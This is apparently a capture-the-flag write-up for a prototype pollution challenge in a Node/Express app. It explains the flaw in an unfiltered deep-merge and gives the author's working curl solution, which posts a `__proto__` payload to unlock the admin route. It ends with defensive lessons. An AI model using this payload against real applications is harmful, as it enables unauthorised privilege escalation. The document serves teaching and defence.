# Prototype Pollution — PrefsHub (Node)

An Express app that deep-merges a JSON body into a session prefs
object. The merge walks `Object.keys(src)` and recurses into
nested objects without filtering `__proto__` / `constructor` /
`prototype` keys.

`JSON.parse('{"__proto__":{"isAdmin":true}}')` produces an object
with `__proto__` as an *own* property. The merge then recurses
*through* `target.__proto__` (which is `Object.prototype`) and
sets `isAdmin = true` on it — polluting every plain object in the
process.

The `/admin` route gates on `session.isAdmin`. New sessions never
set that flag, so the lookup walks the prototype chain — and
finds the polluted value.

## Player target

Unlock `GET /admin` from any session.

## Author solution

```bash
SID=$(curl -s -X POST http://target:3000/prefs \
        -H 'content-type: application/json' \
        -d '{}' | python3 -c 'import sys,json;print(json.load(sys.stdin)["sid"])')

curl -s -X POST http://target:3000/prefs \
  -H 'content-type: application/json' \
  -H "x-session: $SID" \
  -d '{"__proto__":{"isAdmin":true}}'

curl -s http://target:3000/admin -H "x-session: $SID"
# {"flag":"CTF{REDACTED}"}
```

## Why this is the lesson

* Don't write your own deep-merge. Use a library that explicitly
  refuses `__proto__`, `constructor`, and `prototype` keys
  (lodash `_.merge` has had hardening; `defaultsDeep` is not safe
  on untrusted input).
* Create objects with `Object.create(null)` when their shape is
  defined by user input — they have no prototype to pollute.
* Validate request bodies against a schema (Zod / Joi / ajv) *before*
  they touch your data structures.
